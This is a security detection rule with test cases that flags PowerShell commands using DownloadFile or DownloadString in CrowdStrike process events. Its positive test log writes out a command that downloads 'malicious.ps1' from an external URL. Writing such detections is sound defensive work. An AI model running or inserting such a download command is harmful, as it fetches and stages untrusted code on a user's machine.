AnalysisType: rule
Filename: crowdstrike_suspicious_powershell_download.py
RuleID: Crowdstrike.SuspiciousPowershellDownload
DisplayName: Suspicious PowerShell Download
Enabled: true
LogTypes:
  - Crowdstrike.FDREvent
Tags:
  - PowerShell
  - Network Activity
Severity: High
Description: Detects when a PowerShell script is executed with the "DownloadFile" or "DownloadString" method to download potentially malicious content from an external source.
Runbook: Investigate the endpoint for signs of compromise or unauthorized activity. Review the PowerShell command line and the source of the downloaded content.
Reference: N/A
DedupPeriodMinutes: 60
Tests:
  -
    Name: Suspicious PowerShell Download (Positive)
    ExpectedResult: true
    Log:
      {
        "event_simpleName": "ProcessRollup2",
        "FileName": "powershell.exe",
        "CommandLine": "powershell -Command (New-Object System.Net.WebClient).DownloadFile('http://example.com/malicious.ps1', 'C:\\malicious.ps1')"
      }
  -
    Name: Non-Suspicious PowerShell Execution (Negative)
    ExpectedResult: false
    Log:
      {
        "event_simpleName": "ProcessRollup2",
        "FileName": "powershell.exe",
        "CommandLine": "powershell Get-Process"
      }
